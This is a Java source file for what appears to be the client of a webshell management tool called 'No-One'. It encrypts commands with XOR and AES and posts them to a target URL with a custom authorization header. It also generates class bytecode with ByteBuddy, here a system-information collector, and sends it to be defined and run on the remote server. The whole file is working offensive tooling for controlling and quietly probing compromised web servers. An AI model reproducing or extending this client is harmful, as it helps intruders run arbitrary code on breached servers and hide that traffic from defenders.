package com.reajason.noone.client;

import com.reajason.noone.SystemInfoCollector;
import lombok.Getter;
import lombok.Setter;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import okhttp3.*;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.*;

/**
 * @author ReaJason
 * @since 2025/12/13
 */
public class JavaManager {
    private static final String ACTION = "action";
    private static final String CLASSNAME = "className";
    private static final String PLUGIN = "plugin";
    private static final String CLASS_BYTES = "classBytes";
    private static final String ARGS = "args";
    private static final String METHOD_NAME = "methodName";

    private static final String REFRESH = "refresh";
    private static final String CLASS_DEFINE = "classDefine";
    private static final String CLASS_RUN = "classRun";
    private static final String PLUGIN_CACHES = "pluginCaches";

    private static final String ACTION_STATUS = "status";
    private static final String ACTION_RUN = "run";
    private static final String ACTION_CLEAN = "clean";

    private static final String CODE = "code";
    private static final String ERROR = "error";
    private static final String DATA = "data";
    private static final int SUCCESS = 0;
    private static final int FAILURE = 1;

    @Setter
    @Getter
    private String url;

    // 加密配置（格式: "aesKey|xorKey"）
    private String key = "";
    private byte[] aesKey = null;
    private byte[] xorKey = null;

    private Map<String, String> serverPluginCaches = new HashMap<>();
    private final OkHttpClient client = new OkHttpClient.Builder().build();

    public JavaManager() {
        initKeys(key);
    }

    /**
     * 初始化加密密钥
     */
    private void initKeys(String keyString) {
        if (keyString == null || keyString.isEmpty()) {
            aesKey = null;
            xorKey = null;
            return;
        }

        String[] keys = keyString.split("\\|");
        if (keys.length >= 1 && !keys[0].isEmpty()) {
            aesKey = md5(keys[0]);
        }
        if (keys.length >= 2 && !keys[1].isEmpty()) {
            xorKey = keys[1].getBytes(StandardCharsets.UTF_8);
        }
    }

    /**
     * 设置密钥并初始化
     */
    public void setKey(String key) {
        this.key = key;
        initKeys(key);
    }

    public boolean test() {
        Map<String, Object> map = new HashMap<>();
        map.put(ACTION, "status");
        byte[] bytes = serialize(map);
        // Base64 编码
        byte[] base64Data = Base64.getEncoder().encodeToString(bytes).getBytes(StandardCharsets.UTF_8);
        // 加密
        byte[] encryptedData = encryptOutput(base64Data);
        String payload = new String(encryptedData, StandardCharsets.UTF_8);

        RequestBody requestBody = new FormBody.Builder()
                .add("payload", payload)
                .build();
        Request.Builder builder = new Request.Builder()
                .url(url)
                .post(requestBody)
                .header("No-One-Authorization", "No-One-V1");
        try (Response response = client.newCall(builder.build()).execute()) {
            if (response.isSuccessful()) {
                try (ResponseBody body = response.body()) {
                    String result = body.string();
                    // 解密
                    byte[] decryptedData = decryptInput(result.getBytes(StandardCharsets.UTF_8));
                    // Base64 解码
                    byte[] decode = Base64.getDecoder().decode(decryptedData);
                    Map<String, Object> deserialize = deserialize(decode);
                    if (deserialize.get(CODE).equals(SUCCESS)) {
                        serverPluginCaches = (Map<String, String>) deserialize.get(PLUGIN_CACHES);
                        return true;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return false;
    }

    public Map<String, Object> getBasicInfo() {
        Map<String, Object> map = new HashMap<>();
        map.put(ACTION, "run");
        String plugin = "basicInfo";
        map.put(PLUGIN, plugin);
        map.put(METHOD_NAME, "run");
        if (serverPluginCaches.get(plugin) == null) {
            String className = "hello";
            byte[] classBytes = new ByteBuddy().redefine(SystemInfoCollector.class)
                    .name(className).make().getBytes();
            map.put(CLASSNAME, className);
            map.put(CLASS_BYTES, classBytes);
        }
        byte[] bytes = serialize(map);
        // Base64 编码
        byte[] base64Data = Base64.getEncoder().encodeToString(bytes).getBytes(StandardCharsets.UTF_8);
        // 加密
        byte[] encryptedData = encryptOutput(base64Data);
        String payload = new String(encryptedData, StandardCharsets.UTF_8);

        RequestBody requestBody = new FormBody.Builder()
                .add("payload", payload)
                .build();
        Request.Builder builder = new Request.Builder()
                .url(url)
                .post(requestBody)
                .header("No-One-Authorization", "No-One-V1");
        try (Response response = client.newCall(builder.build()).execute()) {
            if (response.isSuccessful()) {
                try (ResponseBody body = response.body()) {
                    String result = body.string();
                    // 解密
                    byte[] decryptedData = decryptInput(result.getBytes(StandardCharsets.UTF_8));
                    // Base64 解码
                    byte[] decode = Base64.getDecoder().decode(decryptedData);
                    Map<String, Object> deserialize = deserialize(decode);
                    if (deserialize.get(CODE).equals(SUCCESS)) {
                        serverPluginCaches.put(plugin, "hello");
                        return (Map<String, Object>) deserialize.get(DATA);
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }


    static final byte NULL = 0x00;
    static final byte STRING = 0x01;
    static final byte INTEGER = 0x02;
    static final byte LONG = 0x03;
    static final byte DOUBLE = 0x04;
    static final byte BOOLEAN = 0x05;
    static final byte BYTE_ARRAY = 0x06;
    static final byte LIST = 0x7;
    static final byte OBJECT_ARRAY = 0x8;
    static final byte MAP = 0x10;

    @SneakyThrows
    public byte[] serialize(Map<String, Object> map) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        DataOutputStream dos = new DataOutputStream(baos);
        writeMap(dos, map);
        return baos.toByteArray();
    }

    @SneakyThrows
    public Map<String, Object> deserialize(byte[] data) {
        ByteArrayInputStream bais = new ByteArrayInputStream(data);
        DataInputStream dis = new DataInputStream(bais);
        byte type = dis.readByte();
        if (type == MAP) {
            return readMap(dis);
        } else {
            throw new IOException("Root object is not a Map.");
        }
    }

    private void writeMap(DataOutputStream dos, Map<String, Object> map) throws IOException {
        dos.writeByte(MAP);
        if (map == null) {
            dos.writeInt(0);
            return;
        }
        dos.writeInt(map.size());
        for (Map.Entry<String, Object> entry : map.entrySet()) {
            dos.writeUTF(entry.getKey());
            writeObject(dos, entry.getValue());
        }
    }

    private void writeObject(DataOutputStream dos, Object obj) throws IOException {
        if (obj == null) {
            dos.writeByte(NULL);
        } else if (obj instanceof String) {
            dos.writeByte(STRING);
            dos.writeUTF((String) obj);
        } else if (obj instanceof Integer) {
            dos.writeByte(INTEGER);
            dos.writeInt((Integer) obj);
        } else if (obj instanceof Long) {
            dos.writeByte(LONG);
            dos.writeLong((Long) obj);
        } else if (obj instanceof Double) {
            dos.writeByte(DOUBLE);
            dos.writeDouble((Double) obj);
        } else if (obj instanceof Boolean) {
            dos.writeByte(BOOLEAN);
            dos.writeBoolean((Boolean) obj);
        } else if (obj instanceof byte[]) {
            dos.writeByte(BYTE_ARRAY);
            byte[] bytes = (byte[]) obj;
            dos.writeInt(bytes.length);
            dos.write(bytes);
        } else if (obj instanceof List) {
            dos.writeByte(LIST);
            List<?> list = (List<?>) obj;
            dos.writeInt(list.size());
            for (Object item : list) {
                writeObject(dos, item);
            }
        } else if (obj instanceof Object[]) {
            dos.writeByte(OBJECT_ARRAY);
            Object[] array = (Object[]) obj;
            dos.writeInt(array.length);
            for (Object item : array) {
                writeObject(dos, item);
            }
        } else if (obj instanceof Map) {
            @SuppressWarnings("unchecked")
            Map<String, Object> subMap = (Map<String, Object>) obj;
            writeMap(dos, subMap);
        } else {
            throw new IllegalArgumentException("Unsupported type for serialization: " + obj.getClass().getName());
        }
    }

    private Map<String, Object> readMap(DataInputStream dis) throws IOException {
        int size = dis.readInt();
        Map<String, Object> map = new HashMap<>(size);
        for (int i = 0; i < size; i++) {
            String key = dis.readUTF();
            Object value = readObject(dis);
            map.put(key, value);
        }
        return map;
    }

    private Object readObject(DataInputStream dis) throws IOException {
        byte type = dis.readByte();
        switch (type) {
            case NULL:
                return null;
            case STRING:
                return dis.readUTF();
            case INTEGER:
                return dis.readInt();
            case LONG:
                return dis.readLong();
            case DOUBLE:
                return dis.readDouble();
            case BOOLEAN:
                return dis.readBoolean();
            case BYTE_ARRAY:
                int len = dis.readInt();
                byte[] bytes = new byte[len];
                dis.readFully(bytes);
                return bytes;
            case LIST:
                int listSize = dis.readInt();
                List<Object> list = new ArrayList<>(listSize);
                for (int i = 0; i < listSize; i++) {
                    list.add(readObject(dis));
                }
                return list;
            case OBJECT_ARRAY:
                int arrayLength = dis.readInt();
                Object[] array = new Object[arrayLength];
                for (int i = 0; i < arrayLength; i++) {
                    array[i] = readObject(dis);
                }
                return array;
            case MAP:
                return readMap(dis);
            default:
                throw new IOException("Unknown data type found in stream: " + type);
        }
    }

    // ==================== 加解密方法 ====================

    /**
     * MD5 哈希（用于生成 AES 密钥）
     */
    private static byte[] md5(String input) {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            return md.digest(input.getBytes(StandardCharsets.UTF_8));
        } catch (Exception e) {
            throw new RuntimeException("MD5 failed", e);
        }
    }

    /**
     * XOR 加密/解密
     */
    private byte[] xor(byte[] data, byte[] key) {
        if (key == null || key.length == 0) {
            return data;
        }
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ key[i % key.length]);
        }
        return result;
    }

    /**
     * AES 加密
     */
    private byte[] aesEncrypt(byte[] data, byte[] key) {
        if (key == null) {
            return data;
        }
        try {
            SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);
            return cipher.doFinal(data);
        } catch (Exception e) {
            throw new RuntimeException("AES encrypt failed", e);
        }
    }

    /**
     * AES 解密
     */
    private byte[] aesDecrypt(byte[] data, byte[] key) {
        if (key == null) {
            return data;
        }
        try {
            SecretKeySpec secretKey = new SecretKeySpec(key, "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKey);
            return cipher.doFinal(data);
        } catch (Exception e) {
            throw new RuntimeException("AES decrypt failed", e);
        }
    }

    /**
     * 加密输出数据（XOR -> AES）
     */
    private byte[] encryptOutput(byte[] plainData) {
        if (aesKey == null && xorKey == null) {
            return plainData;
        }
        byte[] data = plainData;
        data = xor(data, xorKey);
        data = aesEncrypt(data, aesKey);
        return data;
    }

    /**
     * 解密输入数据（AES -> XOR）
     */
    private byte[] decryptInput(byte[] encryptedData) {
        if (aesKey == null && xorKey == null) {
            return encryptedData;
        }
        byte[] data = encryptedData;
        data = aesDecrypt(data, aesKey);
        data = xor(data, xorKey);
        return data;
    }
}
